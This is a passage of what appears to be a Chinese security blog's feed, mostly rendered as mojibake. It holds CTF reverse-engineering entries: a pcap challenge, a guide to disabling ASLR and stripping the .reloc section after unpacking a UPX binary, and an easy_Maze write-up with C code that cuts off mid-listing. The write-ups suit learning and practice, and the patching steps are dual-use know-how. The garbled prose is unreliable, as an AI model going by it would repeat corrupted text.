      &lt;h2 id=&quot;Refresh-it&quot;&gt;&lt;a href=&quot;#Refresh-it&quot; class=&quot;headerlink&quot; title=&quot;Refresh it&quot;&gt;&lt;/a&gt;Refresh it&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;é¢˜ç›®ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ª.pcapngæ–‡ä»¶. å…ˆç”¨010editorçœ‹äº†çœ‹ä¼šä¸ä¼šåªæ˜¯ç®€å•çš„å°†æ–‡ä»¶æ ¼å¼æ”¹äº†, å› ä¸ºæ˜¯reverseé¢˜, çœ‹äº†ä¸€åœˆ, çš„å´æ˜¯æµé‡åŒ….&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åœ¨wiresharkä¸­å°è¯•æœç´¢äº†é¢˜ç›®å…³é”®å­—refresh, æ²¡æœ‰å¾—åˆ°æœ‰ç”¨ä¿¡æ¯. åˆæ¥ç€å°è¯•äº†æœç´¢äº†å¾ˆå¤š, éƒ½æ— æœ. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è½¬åˆ°foremostå’Œbinwalkçœ‹çœ‹æ²¡æœ‰ä»€ä¹ˆéšè—æ–‡ä»¶.  ç¡®å®çœ‹åˆ°äº†2å¼ å›¾ç‰‡, æå–å‡ºæ¥ä½†æ‰“ä¸å¼€, è€ƒè™‘exeæ–‡ä»¶éšè—åœ¨å›¾ç‰‡æ–‡ä»¶ä¸­, æŸ¥çœ‹äº†å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯, PEæ–‡ä»¶çš„å½±å­éƒ½æ²¡æœ‰ğŸ¤£.  æ²¡åŠæ³•äº†, é¢˜ç›®å…ˆæ”¾ä¸€æ®µæ—¶é—´.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>ASLR</title>
    <link href="https://www.bxnop.cn/2020/05/12/ASLR/"/>
    <id>https://www.bxnop.cn/2020/05/12/ASLR/</id>
    <published>2020-05-12T04:15:30.000Z</published>
    <updated>2020-05-30T08:16:17.095Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>å¼€å§‹æ˜¯ä¸€é“CTFé¢˜åŠ äº†UPXå£³,  åˆ©ç”¨å †æ ˆå¹³è¡¡è„±å£³,import recè¿›è¡ŒIATä¿®å¤å,ç¨‹åºä¸èƒ½æ­£å¸¸æ‰“å¼€äº†.  åæ¥æ‰çŸ¥é“æ˜¯å¼€å¯äº†ASLR, å…³é—­åå³å¯æ‰“å¼€.  ä½†æœ‰ä¸€ä¸ªé—®é¢˜æƒ³äº†å¾ˆä¹….  ä¸ºä»€ä¹ˆå¼€å¯äº†ASLRçš„ç¨‹åºåœ¨æœ‰å£³æ—¶å¯ä»¥æ‰“å¼€, è„±å£³åå°±æ‰“ä¸å¼€äº†å‘¢? ç›®å‰è§‰å¾—æ˜¯ åŠ å£³ä¼šå¯¹PEæ–‡ä»¶çš„é‡å®šä½è¡¨è¿›è¡Œå‹ç¼©,åœ¨ODç›´æ¥dumpå‡ºçš„ç¨‹åºæ˜¯ä¸¢å¤±é‡å®šä½è¡¨çš„, è€Œç¨‹åºåˆæ˜¯å¼€å¯äº†ASLR,é‚£ç¨‹åºè‡ªç„¶ä¼šè®¿é—®åˆ°æ— æ•ˆçš„åœ°å€è€Œæ‰“ä¸å¼€</strong></p></blockquote><a id="more"></a><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><ul><li><p>ASLR(åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–), ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯. ä»Windows Vsita(å†…æ ¸ç‰ˆæœ¬<strong>6.0</strong>)å¼€å§‹é‡‡ç”¨, è€ŒWindows XPçš„å†…æ ¸ç‰ˆæœ¬æ˜¯<strong>5.1</strong>, æ‰€ä»¥æˆ‘ä»¬åœ¨Windows XPä¸‹è„±å¼€å¯äº†ASLR çš„å£³æ˜¯ä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜çš„.</p></li><li><p>ASLRå°±æ˜¯ä½¿æˆ‘ä»¬çš„PEæ–‡ä»¶åœ¨æ¯æ¬¡è½½å…¥å†…å­˜æ—¶èµ·å§‹åœ°å€éƒ½ä¼šå˜å¾—éšæœºåŒ–, å¢åŠ æ¶æ„ç”¨æˆ·ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„éš¾åº¦(<strong>åœ¨ä¹‹å‰æˆ‘ä»¬çŸ¥é“åªæœ‰dllæ–‡ä»¶åœ¨ç†æƒ³åœ°å€ç©ºé—´è¢«å ç”¨äº†æ‰ä¼šè¿›è¡Œé‡å®šä½</strong>)</p></li><li><p>å¯¹äºASLRåŠŸèƒ½æˆ‘ä»¬ç³»ç»Ÿ(win10)æ˜¯é»˜è®¤å…³é—­çš„, æˆ‘ä»¬å¯ä»¥åœ¨è®¾ç½®çš„å®‰å…¨ä¸­å¿ƒæ‰“å¼€.<img src="/2020/05/12/ASLR/image-20200511184233641-1589256958059.png" alt="image-20200511184233641"></p><p>å¦å¤–å°±æ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„ASLR, æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„ç¼–è¯‘å™¨ä¸Šä¹Ÿå¯ä»¥é€‰æ‹©æ˜¯å¦å¼•ç”¨è¯¥åŠŸèƒ½.<img src="/2020/05/12/ASLR/image-20200511185012962-1589256958060.png" alt="image-20200511185012962"></p></li></ul><h2 id="åˆ†æASLR"><a href="#åˆ†æASLR" class="headerlink" title="åˆ†æASLR"></a>åˆ†æASLR</h2><ul><li><p>ä»¥VSç¼–è¯‘å™¨å†™ä¸€ä¸ªç¨‹åº, åˆ†åˆ«ç”Ÿæˆå¼€å¯äº†éšæœºåŸºå€ä¸æœªå¼€å¯çš„çš„ç‰ˆæœ¬æ¥åˆ†æ. (<strong>ä¸€å…±æœ‰ä¸‰ä¸ªåœ°æ–¹ä¸åŒ</strong>)</p><p><strong>(1)</strong>æœªå¼€å¯ASLRçš„ç¨‹åºçš„<strong>æ–‡ä»¶å¤´çš„Characteristics</strong>ä¼šå¤šä¸€ä¸ª <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong> çš„å±æ€§, ç»è¿‡æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯ä»¥çœ‹å¾—åˆ°å±æ€§è§£é‡Š, æ‰€ä»¥æˆ‘ä»¬å¼€å¯ASLRdçš„ç¨‹åºä¸ä¼šæœ‰è¿™ä¸ªå±æ€§<img src="/2020/05/12/ASLR/image-20200511200244008-1589256958060.png" alt="image-20200511200244008"></p><p>â€‹    ä¸‹é¢çœ‹ç¨‹åºå¯¹æ¯”:</p><p><img src="/2020/05/12/ASLR/image-20200511201513817-1589256958060.png" alt="image-20200511201513817"></p></li></ul><p>  <strong>(2)</strong>å¼€å¯äº†ASLRçš„ç¨‹åºçš„<strong>å¯é€‰å¤´çš„DllCharacteristics</strong>å¤šäº†<strong>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</strong></p><p>  <strong>0X0040</strong>çš„å±æ€§. åŒæ ·æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£. å³é‡å®šä½æ—¶éœ€è¦çš„å±æ€§.<img src="/2020/05/12/ASLR/image-20200511201801401-1589256958060.png" alt="image-20200511201801401"></p><p>  ç¨‹åºå¯¹æ¯”:<img src="/2020/05/12/ASLR/image-20200511202308748-1589204427416-1589204437657-1589256958060.png" alt="image-20200511202308748"></p><p>  <strong>(3)</strong>å¼€å¯äº†ASLRçš„ç¨‹åºä¼šå¤šä¸€ä¸ª <strong>.reloc</strong> èŠ‚(ä¸€èˆ¬æ™®é€šçš„exeæ–‡ä»¶æ˜¯ä¸éœ€è¦è¯¥èŠ‚çš„, ç”¨äºå¼€å¯ASLRçš„ç¨‹åºè¿›è¡Œé‡å®šä½, å½“ç„¶æˆ‘ä»¬å…³é—­äº†ASLRä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªèŠ‚åˆ äº†)<img src="/2020/05/12/ASLR/image-20200511202858464-1589256958060.png" alt="image-20200511202858464"></p><h2 id="å…³é—­ASLR"><a href="#å…³é—­ASLR" class="headerlink" title="å…³é—­ASLR"></a>å…³é—­ASLR</h2><ul><li><p>ç”±ä¸Šé¢çš„åˆ†æçŸ¥é“æœ‰3å¤„ä¸åŒ, å…¶ä¸­ä¸Šé¢çš„<strong>(1)</strong>ä¸­æ˜¯å¼€å¯äº†ASLRçš„ç¨‹åºå°‘äº† <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong>å±æ€§, æˆ‘ä»¬å¢åŠ ä¸Šè¿™ä¸ªå±æ€§å³å¯å…³é—­ASLR(å³ <strong>0102 -&gt; 0103</strong> / <strong>å¯¹åº”å±æ€§æ‰“ä¸Šå‹¾å³å¯</strong>).    å¦å¤–<strong>(2)</strong>ä¸­æ˜¯å¤šäº†<strong>DLL can move</strong>çš„å±æ€§,åˆ é™¤è¿™ä¸ªå±æ€§,åŒæ ·å¯ä»¥å…³é—­ASLR(å³ <strong>8140 -&gt; 8100</strong> / <strong>å¯¹åº”å±æ€§å–æ¶ˆæ‰“å‹¾å³å¯</strong> )</p><p>ä¸‹é¢ç¤ºä¾‹åœ¨010ç¼–è¯‘å™¨ä¸­ä¿®æ”¹æ•°å€¼æ¥å…³é—­ASLR.<img src="/2020/05/12/ASLR/image-20200511204613644-1589256958060.png" alt="image-20200511204613644"></p></li></ul><blockquote><p><strong>ä»¥ä¸Šæ˜¯å…³äºASLRçš„åˆ†æå³å…³é—­, å¦‚æœå¼€å¯äº†ASLR, æˆ‘ä»¬åœ¨è„±å£³ä¹‹å‰è¿˜æ˜¯å…ˆå…³é—­å®ƒæœ€å¥½,ä¹Ÿæ–¹ä¾¿è°ƒè¯•æ—¶IDAä¸ODä¸­åœ°å€çš„å¯¹åº”(å¦‚æœåªæ˜¯æƒ³åœ°å€å¯¹åº”, ä¹Ÿå¯ä»¥åœ¨IDAä¸­å¯åŠ¨æ—¶æŠŠManual loadå‹¾ä¸Š, æ‰‹åŠ¨è¾“å…¥åŠ è½½çš„åŸºåœ°å€å³å¯),  æ—¢ç„¶å…³é—­äº†ASLR, é‚£å¤šå‡ºçš„.relocèŠ‚ä¹Ÿå°±æ²¡ç”¨äº†, ä¸‹é¢æ‰‹åŠ¨åˆ é™¤è¯¥èŠ‚åŒº(è™½ç„¶æœ‰å¾ˆå¤šå·¥å…·å¯ä»¥ç›´æ¥å®ç°, è¿˜æ˜¯æ‰‹åŠ¨ç†Ÿæ‚‰ä¸‹PEç»“æ„)</strong></p></blockquote><h2 id="åˆ é™¤-relocèŠ‚åŒº"><a href="#åˆ é™¤-relocèŠ‚åŒº" class="headerlink" title="åˆ é™¤.relocèŠ‚åŒº"></a>åˆ é™¤.relocèŠ‚åŒº</h2><ul><li><p>é¦–å…ˆæ¯ä¸ªèŠ‚éƒ½å¯¹åº”ä¸€ä¸ªèŠ‚åŒºå¤´çš„, é‚£å…ˆä»èŠ‚åŒºå¤´å¼€å§‹. ä½¿ç”¨010editorå¯ä»¥è½»æ¾åœ¨æœ€åä¸€èŠ‚åŒºå¤´æ‰¾åˆ°.  æˆ‘ä»¬å°†å…¶å…¨éƒ¨ç”¨0è¦†ç›–å¡«å……å³å¯.(æ³¨: ä¸èƒ½ç›´æ¥åˆ é™¤äº†, ä¸ç„¶PEæ–‡ä»¶çš„å¾ˆå¤šå±æ€§ä¼šå¯¹åº”ä¸ä¸Š)<img src="/2020/05/12/ASLR/image-20200511205903649-1589256958060.png" alt="image-20200511205903649"></p></li><li><p>ä¸‹é¢åˆ é™¤.relocæ•´ä¸ªèŠ‚åŒº(ä¸€èˆ¬è¿™ä¸ªèŠ‚åŒºéƒ½æ˜¯æ–°åŠ çš„,æ‰€ä»¥åœ¨æœ€å, æˆ‘ä»¬åªè¦æ‰¾åˆ°åç§»åœ°å€ç›´æ¥åˆ é™¤åˆ°æœ€åå³å¯), å¦‚å›¾, ç›´æ¥åˆ é™¤åˆ°æœ€åå³å¯. (è¿™é‡Œçš„Size: 600h, ä¸‹é¢æœ‰ç”¨)<img src="/2020/05/12/ASLR/image-20200511210742225-1589256958060.png" alt="image-20200511210742225"></p></li><li><p>åˆ é™¤å®Œå, æˆ‘ä»¬çŸ¥é“PEæ–‡ä»¶å¤´çš„<strong>_IMAGE_FILE_HEADER</strong>çš„<strong>NumberOfSections</strong>çš„å€¼ä¸€å®šè¦ä¸¥æ ¼çš„ä¸å®é™…èŠ‚åŒºå¯¹åº”, æ‰€ä»¥å»ä¿®æ”¹ <strong>_IMAGE_FILE_HEADER</strong>çš„<strong>NumberOfSections</strong>ä½¿å…¶å‡ä¸€.<img src="/2020/05/12/ASLR/image-20200511210943674-1589256958060.png" alt="image-20200511210943674">)<img src="/2020/05/12/ASLR/image-20200511211434269-1589256958060.png" alt="image-20200511211434269"></p></li><li><p>æœ€åè¿˜æœ‰ä¿®æ”¹ä¸€ä¸ªå±æ€§, å°±æ˜¯PEæ–‡ä»¶å¤´ <strong>_IMAGE_OPTIONAL_HEADER</strong></p><p>çš„<strong>SizeOfImage</strong>, ä¿®æ”¹ä¸ºå‡å» .relocèŠ‚åŒºåçš„å¤§å°  ä»ä¸Šé¢æˆ‘ä»¬çŸ¥é“.relocå¤§å°æ˜¯600h, è€Œè¯¥PEæ–‡ä»¶<strong>SectionAlignment(èŠ‚åœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½ (å¯¹é½å•ä½) ä¸€èˆ¬ä¸º: 1000h)ä¸º1000h</strong>, 1000h &gt; 600h. ä»¥1000hå¯¹é½, æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†<strong>SizeOfImage</strong>å‡å»1000hå³å¯.<img src="/2020/05/12/ASLR/image-20200511211537176-1589256958060.png" alt="image-20200511211537176">)<img src="/2020/05/12/ASLR/image-20200511212159056-1589256958060.png" alt="image-20200511212159056"></p><blockquote><p>å¦‚æœæƒ³å¢åŠ ä¸€ä¸ªèŠ‚åŒº, ä¹Ÿå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹æ³•</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;å¼€å§‹æ˜¯ä¸€é“CTFé¢˜åŠ äº†UPXå£³,  åˆ©ç”¨å †æ ˆå¹³è¡¡è„±å£³,import recè¿›è¡ŒIATä¿®å¤å,ç¨‹åºä¸èƒ½æ­£å¸¸æ‰“å¼€äº†.  åæ¥æ‰çŸ¥é“æ˜¯å¼€å¯äº†ASLR, å…³é—­åå³å¯æ‰“å¼€.  ä½†æœ‰ä¸€ä¸ªé—®é¢˜æƒ³äº†å¾ˆä¹….  ä¸ºä»€ä¹ˆå¼€å¯äº†ASLRçš„ç¨‹åºåœ¨æœ‰å£³æ—¶å¯ä»¥æ‰“å¼€, è„±å£³åå°±æ‰“ä¸å¼€äº†å‘¢? ç›®å‰è§‰å¾—æ˜¯ åŠ å£³ä¼šå¯¹PEæ–‡ä»¶çš„é‡å®šä½è¡¨è¿›è¡Œå‹ç¼©,åœ¨ODç›´æ¥dumpå‡ºçš„ç¨‹åºæ˜¯ä¸¢å¤±é‡å®šä½è¡¨çš„, è€Œç¨‹åºåˆæ˜¯å¼€å¯äº†ASLR,é‚£ç¨‹åºè‡ªç„¶ä¼šè®¿é—®åˆ°æ— æ•ˆçš„åœ°å€è€Œæ‰“ä¸å¼€&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="PE" scheme="https://www.Bxnop.cn/categories/PE/"/>
    
    
      <category term="ç³»ç»Ÿ" scheme="https://www.Bxnop.cn/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>re æ”»é˜²ä¸–ç•Œï¼ˆ3ï¼‰</title>
    <link href="https://www.bxnop.cn/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/</id>
    <published>2020-05-03T05:49:15.000Z</published>
    <updated>2020-06-16T07:00:48.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h2><ul><li><p>è¿™é“é¢˜å¯¹æ–°æ‰‹è¿˜æ˜¯å¾ˆå¥½. </p></li><li><p>ç”±é¢˜ç›®æˆ‘ä»¬èƒ½çŸ¥é“æ˜¯å…³äºè¿·å®«çš„é¢˜. ä¸‹è½½ä¸‹æ¥æ˜¯elfæ–‡ä»¶, æŸ¥å£³åæ— å£³, åœ¨linuxä¸‹è¿è¡Œçœ‹çœ‹å¤§æ¦‚æµç¨‹. </p></li><li><p>è½½å…¥IDA, å…ˆåˆ†æäº†æ¥å—æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„å‡½æ•°.  çŸ¥é“åœ¨å¤–é¢ä¸€å±‚çš„ä¸»å‡½æ•°æ˜¯å…ˆç”Ÿæˆä¸€ä¸ªæ¯è¡Œ7ä¸ªå…ƒç´ çš„æ•°ç»„. ç„¶åé€šè¿‡æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æŒ‰æ§åˆ¶åœ¨çŸ©é˜µè¿·å®«ä¸­èµ°å‘, æœ€åæŒ‰ç…§è§„å®šçš„åˆ°è¾¾ä¸€ä¸ªç›®çš„åœ°.<a id="more"></a><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200504133456542-1592290152904.png" alt="image-20200504133456542"></p></li><li><p>æ¥ä¸‹æ¥è¿”å›å¤–ä¾§çš„ä¸»å‡½æ•°, å°±æ˜¯ç”ŸæˆçŸ©é˜µçš„äº†. é€šè¿‡ä¸Šé¢çš„49ä¸ªå…ƒç´ çŸ¥é“ä¸”ä¸‹é¢å‡½æ•°çš„å‚æ•°7, çŸ¥é“è§„æ¨¡ 7*7. <img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200504133948097-1592290160103.png" alt="image-20200504133948097"></p></li><li><p>è¿›å…¥<strong>Step_0</strong> çœ‹çœ‹. å°±æ˜¯ç®€å•çš„æŠŠä¸Šé¢49ä¸ªå…ƒç´ èµ‹å€¼ç»™ v7 æ•°ç»„, ä¹Ÿå°è¯äº†æ•°ç»„æ˜¯7*7</p><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200506194728611-1592290641234.png" alt="image-20200506194728611"></p></li><li><p>æ¥ä¸‹æ¥ <strong>Step_1</strong>, çœ‹èµ·æ¥æ˜¯å¾ˆç®€æ´, ä½†é‡Œé¢çš„ <strong>getA</strong>ä¸ <strong>getAstart</strong> å‡½æ•° ç®—æ³•å¤ªå†—é•¿äº†.</p><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200506195403856-1592290472100.png" alt="image-20200506195403856"></p></li><li><p>è¿™ä¸ªæ—¶å€™, å¼€å§‹æˆ‘å°±æŠŠç”ŸæˆçŸ©é˜µçš„æ‰€æœ‰å‡½æ•°åŠæ•°æ®éƒ½å¤åˆ¶åˆ°<strong>VC</strong> ç¼–è¯‘å™¨ä¸­, å†æ ¹æ®æ ˆçš„ç‰¹ç‚¹æ”¹ä¸‹æ•°æ®çš„é¡ºåº(<strong>æ•°æ®å­˜æ”¾æ˜¯ä»ä¸‹å¾€ä¸Š, é‚£ä¹ˆæˆ‘ä»¬å–æ•°æ®æ—¶åœ°å€æ¯æ¬¡å‡1è€Œä¸æ˜¯åŠ ä¸€</strong>), ç„¶åè¿è¡Œæ‰“å°å‡ºçŸ©é˜µ. é—®é¢˜æ˜¯è¿è¡Œåä»€ä¹ˆä¹Ÿæ²¡æœ‰æ‰“å°, è°ƒè¯•å‘ç°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…å­˜ç©ºé—´å’Œå¦å¤–ä¸€ä¸ªå†²çª, ç›¸äº’è¦†ç›–å€¼. è¿™ä¸ªå‡½æ•°å¤ªå¤š,å…³è”æ€§å¤§, æ”¹èµ·æ¥ä¹Ÿéº»çƒ¦.</p></li><li><p>ç„¶åè½¬å‘GDBè°ƒè¯•, ä½†æ˜¯ä¸ç†Ÿç»ƒ. åˆè½¬å‘idaåŠ¨æ€è°ƒè¯•. é¦–å…ˆ<strong>åœ¨ IDA çš„å®‰è£…ç›®å½•/dbgsrc/æ‰¾åˆ° linux_server å’Œ linux_server64 æ‹·è´åˆ° linux</strong> ,åœ¨linuxä¸­è¿è¡Œ <strong>linux_server64</strong>, ç„¶ååœ¨Debuggerçš„ process options å¦‚ä¸‹å›¾æ ¼å¼é…ç½®. ç„¶åF9å¼€å§‹.</p><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200506202545180-1592290263125.png" alt="image-20200506202545180"></p></li><li><p>å…ˆä¸‹æ–­ç‚¹, æ‰¾åˆ°å‚¨å­˜çŸ©é˜µçš„ç©ºé—´çš„åœ°å€, æŠŠè¿™ä¸ªåœ°å€è½¬åˆ°æ•°æ®çª—å£è·Ÿéš, ç„¶åè¿è¡Œåˆ°ç”ŸæˆçŸ©é˜µçš„ä¸‹é¢ä¸€ä¸ªå‡½æ•°(ä¹Ÿå°±æ˜¯(<strong>Step_1</strong>ä¸‹é¢). åœ¨æ•°æ®çª—å£å‡ºç°æˆ‘ä»¬çš„æ•°æ®(intå‹), ç”±äºæ˜¯49ä¸ªå…ƒç´ , 49*4/16 = 12 â€¦4  ,é‚£å°±æ˜¯12è¡ŒåŠ 4ä¸ªæ•°æ®, <strong>shift+E</strong>æå–å‡ºCè¯­è¨€æ ¼å¼çš„æ•°æ®.<img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200504135411101-1592290168306.png" alt="image-20200504135411101"></p></li><li><p>æ•°æ®å¾—åˆ°å, ç”¨Cè¯­è¨€æ‰“å°å‡ºæ¥å¥½è§‚å¯Ÿ, æ³¨æ„æ¯ä¸ªæ•°æ®4ä¸ªå­—èŠ‚(å°ç«¯). </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span> <span class="comment">//æ¯ä¸ªæ•°æ®4ä¸ªå­—èŠ‚, ä¸”å°ç«¯. ç”¨è”åˆ</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">196</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">49</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span 